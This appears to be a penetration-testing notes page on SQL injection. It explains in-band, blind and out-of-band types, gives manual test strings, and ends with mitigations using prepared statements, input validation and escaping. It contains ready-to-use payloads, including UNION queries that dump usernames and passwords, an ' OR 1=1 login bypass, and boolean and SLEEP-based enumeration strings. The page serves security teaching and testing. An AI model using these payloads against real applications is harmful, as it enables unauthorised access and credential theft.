# SQL Injection

SQL Injection (SQLi) is a type of attack on web applications. It happens when an application uses unvalidated user input to interact with a database. This can allow attackers to access, modify, or delete sensitive data. They might also bypass authentication to access private areas. SQLi is an old but highly damaging vulnerability.



## SQLi Types/Payloads

### In-Band SQLi

In-Band SQL Injection is easy to find and exploit. It uses the same communication method to attack and get results. For example, you can discover an SQL Injection flaw on a website and extract database data to the same page.

<details>

<summary>Error-Based SQL Injection</summary>

SQL Injection exploits can reveal database details by displaying error messages directly in the browser, useful for mapping the database.

</details>

<details>

<summary>Union-Based SQL Injection</summary>

This SQL Injection technique uses the UNION operator with a SELECT statement to show more data on a web page. It's a common method to extract large amounts of data through an SQL Injection vulnerability.

{% code overflow="wrap" %}
```sql
# get error to enumerate the db
1' UNION SELECT 1; -- '

# find the number of columns needed
1' UNION SELECT 1,2; -- '
1' UNION SELECT 1,2,3; -- '

# get current db
0' UNION SELECT 1,2,database(); -- '

# get database tables
0' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'shop'; -- '

# get columns name of a table
0' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'; -- '

# get data from a table
0' UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users; -- '
```
{% endcode %}

</details>

### Blind SQLi

Blind SQL injection differs from In-Band SQL injection because it doesn't show results directly on the screen. In Blind SQLi, we receive little to no feedback because error messages are turned off. However, the injection still functions, and even a tiny bit of feedback can help us gather information from the entire database.

<details>

<summary>Authentication Bypass</summary>

Blind SQL Injection is often used to bypass login forms. Here, the goal isn't to retrieve data from the database but simply to gain access by bypassing authentication.

Get a scenario where we have a Login page with Username and Password. The query should be this:

```sql
select * from users where username='%username%' and password='%password%' LIMIT 1;
```

Insert the payload bellow into the Password field can allow us to ignore the password check and access without insert the correct password.

```sql
# payload in password field
' OR 1=1;-- '

# query changed into this
select * from users where username='admin' and password='' OR 1=1;
```

{% hint style="info" %}
Using `1=1` in a query with an **OR** operator **always returns true**. This tricks the web application into thinking a username/password match is found, allowing access.
{% endhint %}

</details>

<details>

<summary>Boolean Based</summary>

Boolean-based SQL Injection involves using true/false responses from injection attempts to determine success. Although it may seem limited, these responses can help reveal the entire database structure and its contents.

Using the function LIKE we can find out the letters of a Database, Table, Column and Data Row.

For example we have a API endpoint that return True/Falso if a user exists and the parameter is vulnerable to SQLi. Abusing of this parameter we can obtain all information to dump the DB.

{% code overflow="wrap" %}
```sql
# try any chars to find DB name
admin123' UNION SELECT 1,2,3 where database() like 's%';--    '

# try any chars to find tables name
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--         '

# try any chars to find columns name        
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';     '

# check for some existing user   
admin123' UNION SELECT 1,2,3 from users where username like 'a%

# check for the correct password of found users
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```
{% endcode %}

</details>

<details>

<summary>Time-Based</summary>

Time-based blind SQL injection is similar to boolean-based injection, but there are no visual signs to check if your queries are correct. Instead, you determine success by the time taken for the query to complete. This is often done by using the **`SLEEP(x)`** function with a `UNION` statement. The `SLEEP()` function runs only when a `UNION SELECT` statement is successful.

<pre class="language-sql" data-overflow="wrap"><code class="lang-sql"><strong># try SLEEP function to test SQLi
</strong><strong>mario' UNION SELECT SLEEP(5),2,3;--    
</strong><strong>
</strong><strong># repeat the Boolean-Based SQLi enumeration process to find out db informations 
</strong>admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--

admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'a%';--         '

admin123' UNION SELECT SLEEP(5),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'a%';

admin123' UNION SELECT SLEEP(5),2 from users where username like 'a%

admin123' UNION SELECT SLEEP(5),2 from users where username='admin' and password like 'a%
</code></pre>

</details>

<details>

<summary>Out-of-Band SQLi</summary>



Out-of-band SQL Injection is not very common because it relies on certain database features or specific logic in a web application that makes external network requests based on SQL query results.

This type of attack uses two communication channels: one to execute the attack and another to receive the results. For example, the attack channel might be a web request, while the data collection channel could involve monitoring HTTP or DNS requests to a server you control.

Here's how it works:

1. An attacker sends a request with a malicious SQL payload to a vulnerable website.
2. The website processes the SQL query, including the attacker's payload, with the database.
3. The payload triggers the server to send an HTTP request back to the attacker containing sensitive data from the database.

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

</details>



## Testing for SQLi

Testers should find app features where users can enter data, which may impact the database. For each feature found, testers must test for vulnerabilities by using harmful strings and values.

### Vulnerable input recon

Using special characters in SQL inputs like `'`, `"`, `#`, `;`, `)`, `*`, and `%` can cause SQL errors, sometimes visible to users. This can show that the inputs aren't properly sanitized, making them vulnerable to SQL injection.

For every payload do not forget to try url encoding or others.

### Manual Test

Try this payloads below for each input in the web app. Tools like Burp can help us to do this.

{% code title="Request" %}
```javascript
/page?id=PAYLOAD
```
{% endcode %}

{% code title="Manual Payloads" %}
```
id=1
id=1'
id=1"
id=[1]
id[]=1
id=1`
id=1\
id=1/**/
id=1/*!111'*/
id=1' or '1'='1
id=1 or 1=1
id=' or ''='
id=' OR 1 -- -
id=1' or 1=1 --
id=1' or 1=1 -- -
id=1' or 1=1 /*
id='='
```
{% endcode %}



### Automatic Tools

{% content-ref url="../../../../../tools/web-tools/sqlmap.md" %}
[sqlmap.md](../../../../../tools/web-tools/sqlmap.md)
{% endcontent-ref %}



## Mitigations

SQL Injection (SQLi) vulnerabilities can severely compromise the integrity, confidentiality, and availability of a web application and its data. To prevent SQLi, developers should adopt the following secure coding practices:

#### 1. Use Prepared Statements

Prepared statements ensure that SQL code and user input are separated, preventing attackers from injecting malicious SQL. This is the most effective and recommended mitigation technique.

<details>

<summary>Python mitigation code</summary>

```python
import sqlite3

conn = sqlite3.connect('example.db')
cursor = conn.cursor()

# Unsafe: vulnerable to SQLi
# cursor.execute("SELECT * FROM users WHERE username = '%s'" % user_input)

# Safe: parameterized query
cursor.execute("SELECT * FROM users WHERE username = ?", (user_input,))
```

</details>

<details>

<summary>PHP with PDO mitigation code</summary>

```php
$pdo = new PDO('mysql:host=localhost;dbname=testdb', 'user', 'pass');

// Unsafe
// $stmt = $pdo->query("SELECT * FROM users WHERE email = '$email'");

// Safe
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = :email");
$stmt->execute(['email' => $email]);
```

</details>

#### 2. Validate Input

Input validation ensures user-supplied data adheres to expected formats and values before itâ€™s processed. It should complement (not replace) prepared statements.

**Best Practices:**

* Use allow lists (e.g., for usernames, only allow alphanumeric characters).
* Reject or sanitize unexpected input types (e.g., strings where numbers are expected).
* Normalize and trim input to prevent bypasses.

<details>

<summary>Regex in Python</summary>

```python
import re

def is_valid_username(username):
    return re.match(r'^[a-zA-Z0-9_]{3,30}$', username) is not None
```

</details>

#### 3. Escape User Input

Allowing characters like `'`, `"`, `$`, and `\` can cause SQL queries to break or open them to attacks. Escaping user input involves adding a backslash (`\\`) before these characters, treating them as regular strings rather than special characters.

<details>

<summary>PHP with <code>mysqli_real_escape_string</code> mitigation code</summary>

```php
$conn = new mysqli('localhost', 'user', 'pass', 'testdb');
$user_input = $conn->real_escape_string($_GET['username']);
$query = "SELECT * FROM users WHERE username = '$user_input'";
```

</details>
